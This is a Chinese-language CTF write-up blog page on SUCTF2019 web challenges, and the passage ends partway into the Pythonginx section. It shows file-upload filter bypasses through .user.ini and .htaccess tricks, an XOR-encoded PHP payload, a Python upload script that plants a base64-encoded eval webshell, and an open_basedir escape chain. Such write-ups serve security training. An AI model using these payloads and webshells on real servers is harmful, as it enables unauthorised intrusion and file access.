@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,ctf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="8月中的国内赛，比起国际赛的相对容易，当时就打了一天，现在补一下">
+<meta name="keywords" content="web,ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF2019-web-wp">
+<meta property="og:url" content="http://yoursite.com/2019/12/11/SUCTF2019-web-wp/index.html">
+<meta property="og:site_name" content="k0t0r1の家">
+<meta property="og:description" content="8月中的国内赛，比起国际赛的相对容易，当时就打了一天，现在补一下">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/779847401a4f4f780004b5fcf8e8cb1c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/4f704bd2d8466d2153feb3eba228c72a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/74160716ecadb09b007aabe821b634c1.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/82badccf8373a1cb106f22c5d1878bd2.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/57340f0966e5f2ba1ed6fa4125d34607.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/8659c6edf6cb5538a00e825593681204.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/07bf17b32344d355c5d8f74bd2a8e29a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/7608fc636d33d87b1c791de191cb37c1.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/e186d9343aa7d6f46288c4fc4f9deba9.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/74e25271698257b7ead97821b1ff6785.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/773bba78f13e6ed8543bda95da293174.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/9c53b9eabacbac05cab620e1bec5ee3a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/9bf62b67796fb963b1dd0d3e29ab1ae2.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/ca33e1573b362411b9884715c3716c1e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/171d97396b9693d76ee6dde275118779.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/e08c26d7a8b6ff2f2af8a0ceee34c93b.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/55dd157004aeec1fa93378df0604f958.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/3c985041496cf067040b98b8f0e67dfd.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/9f209f063ed315a544d9724ae1835058.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/f0e78ef64cd1b26a76e3b54b9ccd09f3.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/df2239790651ed52741961407084995b.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/8def7ea54073e25b98df83dd85065f0b.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/78beabbd61a75e8c857bcf796b382c94.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/60571effa1f36864dc1ef866e2d01789.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/5e476461b515fcd71e29350c83f0209d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/037ee36f681ce5527653bc6f224150bd.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/3991cefd6baf23dc560d650d503ec6ef.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/7b31a7abd55c4184ae5f0724acde38ea.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/c92333620f8df0fb90230d37283ac39e.png">
+<meta property="og:updated_time" content="2019-12-31T08:25:53.271Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SUCTF2019-web-wp">
+<meta name="twitter:description" content="8月中的国内赛，比起国际赛的相对容易，当时就打了一天，现在补一下">
+<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/779847401a4f4f780004b5fcf8e8cb1c.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/11/SUCTF2019-web-wp/">
+
+
+
+
+
+  <title>SUCTF2019-web-wp | k0t0r1の家</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">k0t0r1の家</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/11/SUCTF2019-web-wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="k0t0r1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="k0t0r1の家">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SUCTF2019-web-wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-11T00:36:34+08:00">
+                2019-12-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>8月中的国内赛，比起国际赛的相对容易，当时就打了一天，现在补一下</p>
+<a id="more"></a>
+<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>进去一个上传界面，直接传一个php上去</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/779847401a4f4f780004b5fcf8e8cb1c.png" alt=""></p>
+<p>后缀被过滤</p>
+<p>直接传一张图</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/4f704bd2d8466d2153feb3eba228c72a.png" alt=""></p>
+<p>提示不允许&lt;?，也就是说检查到了内容中。这里可以用<code>&lt;script language=&quot;php&quot;&gt;</code>绕过，但问题在于需要解析为php才行</p>
+<p>于是尝试构造.htaccess上传</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/74160716ecadb09b007aabe821b634c1.png" alt=""></p>
+<p>检查了文件头，给.htaccess添加文件头会导致.htaccess失效，于是无法利用.htaccess来将jpg解析为php（而且后面发现服务器是nginx而不是apache</p>
+<p>于是构造一张能上传的gif，主要是由于大一点的图片就会有&lt;?，同时gif头比较短好构造</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/82badccf8373a1cb106f22c5d1878bd2.png" alt=""></p>
+<p>可以看到创建了一个文件夹并在其中有个<code>index.php</code></p>
+<p>这里要利用的是<code>.user.ini</code>的漏洞，这个漏洞在apache,nginx,IIS这些服务器上都能利用，只要是通过fastcgi运行的php都能够使用<br>具体可以参考一下这里<a href="http://www.vuln.cn/6001" target="_blank" rel="noopener">.user.ini文件构成的PHP后门 – phith0n</a></p>
+<p><code>.user.ini</code>是用来自定义的一个ini，它影响的范围是该文件夹下的文件，也就是说能通过<code>.user.ini</code>使得不同文件夹下的php具有不同的配置。不过<code>PHP_INI_SYSTEM</code>模式的配置是不能<code>.user.ini</code>来进行配置，只能由<code>php.ini</code>配置。<br>而php中个很有用的配置<code>auto_prepend_file</code>，先给个例子<br><code>auto_prepend_file=config.php</code><br>这样配置完<code>auto_prepend_file</code>后，所有的php都会包含这个<code>config.php</code>。这样就可以省去在php中进行include和require一些配置文件<br>虽然很有用，但这也造成了漏洞，如果我们修改了<code>auto_prepend_file</code>并指向一个木马文件，那就可以通过访问任意站内的php去执行木马</p>
+<p>这里利用这点，正好这个目录下自动创建了一个<code>index.php</code>，于是尝试去构造一个<code>.user.ini</code>并上传</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/57340f0966e5f2ba1ed6fa4125d34607.png" alt=""></p>
+<p>这样如果能使用的话，再上传一个带有由一句话的gif，就能由于<code>index.php</code>引入了1.gif进而利用</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/8659c6edf6cb5538a00e825593681204.png" alt=""></p>
+<p>上传后访问</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/07bf17b32344d355c5d8f74bd2a8e29a.png" alt=""></p>
+<p>成功，接着读根目录</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/7608fc636d33d87b1c791de191cb37c1.png" alt=""></p>
+<p>有flag，直接cat</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/e186d9343aa7d6f46288c4fc4f9deba9.png" alt=""></p>
+<h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p>读源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_the_flag()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">        mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">        if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">            if(mb_strpos(file_get_contents($tmp_name), &apos;&lt;?&apos;)!==False) die(&quot;^_^&quot;);</span><br><span class="line">        if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[&apos;_&apos;];</span><br><span class="line"></span><br><span class="line">if (!$hhh)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">    die(&apos;One inch long, one inch strong!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( preg_match(&apos;/[\x00- 0-9A-Za-z\&apos;&quot;\`~_&amp;.,|=[\x7F]+/i&apos;, $hhh) )</span><br><span class="line">    die(&apos;Try something else!&apos;);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, 3);</span><br><span class="line">if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">eval($hhh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看出这题分为两部分，一个对hhh进行检验然后执行，还有get_the_flag()的上传文件利用</p>
+<p>这里对hhh检验了三步<br><code>if(strlen($hhh)&gt;18)</code><br>长度不得大于18<br><code>if(preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`</code>~<em>&amp;.,|=[\x7F]+/i’, $hhh))<code>hhh不得包含0-9,a-z,A-Z,\x00-\x7f,&#39;&quot;</code>~</em>&amp;.,|=这些符号<br><code>$character_type = count_chars($hhh, 3);</code><br><code>if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</code><br>hhh包含的不同字符不得多于12</p>
+<p>这里比较麻烦的是正则检验，其它两个可以使用{$_GET[‘x’]}绕过<br>绕过正则要用点小技巧，参考这里<br><a href="https://github.com/Samik081/ctf-writeups/blob/master/ISITDTU%20CTF%202019%20Quals/web/easyphp.md" target="_blank" rel="noopener">Samik081/ctf-writeups
+</a><br>我们可以利用|!~^这些计算符号，去使用为过滤的字符计算出需要的字符从而绕过过滤<br>这里用取反或者异或都行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($i=0x80;$i&lt;0xff;$i++)&#123;</span><br><span class="line">	if(($i^0x80)==ord(&quot;_&quot;))&#123;</span><br><span class="line">		echo &quot;_:&quot;.dechex($i).&quot;&lt;br&gt;&quot;;</span><br><span class="line">	&#125;else if(($i^0x80)==ord(&quot;G&quot;))&#123;</span><br><span class="line">		echo &quot;G:&quot;.dechex($i).&quot;&lt;br&gt;&quot;;</span><br><span class="line">	&#125;else if(($i^0x80)==ord(&quot;E&quot;))&#123;</span><br><span class="line">		echo &quot;E:&quot;.dechex($i).&quot;&lt;br&gt;&quot;;</span><br><span class="line">	&#125;else if(($i^0x80)==ord(&quot;T&quot;))&#123;</span><br><span class="line">		echo &quot;T:&quot;.dechex($i).&quot;&lt;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简单计算一下得到payload<br><code>_=${ %80%80%80%80^%df%c7%c5%d4 }{ %80 }();&amp;%80=get_the_flag</code>(这里有点格式问题就加了空格，记得删)<br>这里为了不同字符不多于12，将参数名设为<code>%80%df%c7%c5%d4</code>其中一个就行了【出题的大佬故意这么设的吧</p>
+<p>然后到上传文件部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">       $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">       $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">       $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">       if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">           if(mb_strpos(file_get_contents($tmp_name), &apos;&lt;?&apos;)!==False) die(&quot;^_^&quot;);</span><br><span class="line">       if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">       $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">       @move_uploaded_file($tmp_name, $path);</span><br><span class="line">       print_r($path);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>检查后缀名和内容，感觉和上题差不多，不过这次没有<code>index.php</code>生成，只用<code>.user.ini.</code>起不了效，需要<code>.htaccess</code>。但要使用<code>.htaccess</code>有个问题，由于检查了头部就必须添加图片格式的头部在<code>.htaccess</code>中，而如果<code>.htaccess</code>格式错误就会导致整个目录出错500</p>
+<p>这里查到是原题是Insomni’hack CTF-l33t-hoster<br>题解使用了xbm格式<br>xbm文件是通过C来标识文件的，举一个例子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16 </span><br><span class="line">#define test_height 7 </span><br><span class="line">static char test_bits[] = &#123; 0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80, 0x00, 0x60 &#125;;</span><br></pre></td></tr></table></figure>
+<p>xbm被<code>exif_imagetype()</code>检查的部分为前两行define的部分，而<code>.htaccess</code>中#为注释，这样可通过<code>exif_imagetype()</code>检测并且<code>.htaccess</code>也不会出错<br>还有大佬测试测出使用wbmp格式，头为<code>00008A398A39</code>也是能够绕过并执行的，可能是由于<code>0x00</code>在<code>.htaccess</code>也是注释。同时还和<code>exif_imagetype()</code>检查幻数有关【不太懂</p>
+<p>绕过<code>.htaccess</code>后图片就简单了，随便一个图片头都可以。于是依旧尝试和上题一样用<code>&lt;script&gt;</code>但无法执行，想了想才意识到既然用了复杂变量那就是php7了，<code>&lt;script&gt;</code>无法使用。于是这里还要在<code>.htaccess</code>中添加<code>php_value auto_append_file</code>，和上题差不多。不过这次用<code>php://filter</code>伪协议去base64解码上传的文件，然后上传的文件里用base64编码一下就可以绕过<code>&lt;?</code>了</p>
+<p>这里还要保证解压出来后还是一句话，文件头后补满到四的倍数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = &quot;http://b00b976d-c189-419d-9d7e-4f38e3f2db5f.node3.buuoj.cn/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot;</span><br><span class="line"></span><br><span class="line"># .htaccess</span><br><span class="line">htaccess = b&quot;&quot;&quot;#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .xxx</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_33c6f8457bd77fce0b109b4554e1a95c/shell.xxx&quot;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">files = [(&apos;file&apos;,(&apos;.htaccess&apos;,htaccess,&apos;image/jpeg&apos;))]</span><br><span class="line">data = &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"># shell.xxx</span><br><span class="line">shell = b&quot;GIF89aaa&quot;+base64.b64encode(b&quot;&lt;?php eval($_GET[&apos;a&apos;]);?&gt;&quot;)</span><br><span class="line">files = [(&apos;file&apos;,(&apos;shell.xxx&apos;,shell,&apos;image/jpeg&apos;))]</span><br><span class="line">data = &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<p>测试一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/74e25271698257b7ead97821b1ff6785.png" alt=""></p>
+<p>上传成功，读波目录</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/773bba78f13e6ed8543bda95da293174.png" alt=""></p>
+<p>没有返回，去看看phpinfo</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/9c53b9eabacbac05cab620e1bec5ee3a.png" alt=""></p>
+<p>可以看到系统函数都被ban了，那用<code>scandir()</code>读目录</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/9bf62b67796fb963b1dd0d3e29ab1ae2.png" alt=""></p>
+<p>然而是个假flag，于是直接读根目录但是不行<code>print_r(scandir(&#39;/&#39;));</code>，但无返回。</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/ca33e1573b362411b9884715c3716c1e.png" alt=""></p>
+<p>回去phpinfo看看，果然又是open_basedir，绕一波读根目录</p>
+<p><code>mkdir(&#39;kotori&#39;);chdir(&#39;kotori&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(scandir(&#39;/&#39;));</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/171d97396b9693d76ee6dde275118779.png" alt=""></p>
+<p><code>mkdir(&#39;kotori&#39;);chdir(&#39;kotori&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;THis_Is_tHe_F14g&#39;));</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/e08c26d7a8b6ff2f2af8a0ceee34c93b.png" alt=""></p>
+<p>获得flag</p>
+<p>不过这题的假flag中提示了fpm，后面看官方wp也提到了这个，先码着以后再看看<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>
+<h2 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h2><p>看题目应该是python+nginx的题<br>进去F12看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/getUrl&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def getUrl():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    if host == &apos;suctf.cc&apos;:</span><br><span class="line">        return &quot;我扌 your problem? 111&quot;</span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[1]</span><br><span class="line">    if host == &apos;suctf.cc&apos;:</span><br><span class="line">        return &quot;我扌 your problem? 222 &quot; + host</span><br><span class="line">    newhost = []</span><br><span class="line">    for h in host.split(&apos;.&apos;):</span><br><span class="line">        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))</span><br><span class="line">    parts[1] = &apos;.&apos;.join(newhost)</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host == &apos;suctf.cc&apos;:</span><br><span class="line">        return urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    else:</span><br><span class="line">        return &quot;我扌 your problem? 333&quot;</span><br></pre></td></tr></table></figure>
+<p>这里检查了三次hostname，要求前两次检查不为<code>suctf.cc</code>，最后一次为<code>suctf.cc</code>才会去读取。这里应该就是通过<code>urlopen()</code>读flag，问题是怎么绕过前两次</p>
+<p>前面两次看起来没什么方法绕过，于是看第二次到第三次间做了什么<br>它这里用不同的编码进行了编码解码，可能漏洞就在这<br><code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code><br>查一下idna和utf-8可以看到很多这两个编码间转码造成的问题<br>而且可以查到在blackhat大会上也提到了这个<br><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</a></p>
+<p>于是测试一下有什么可以使用的</p>
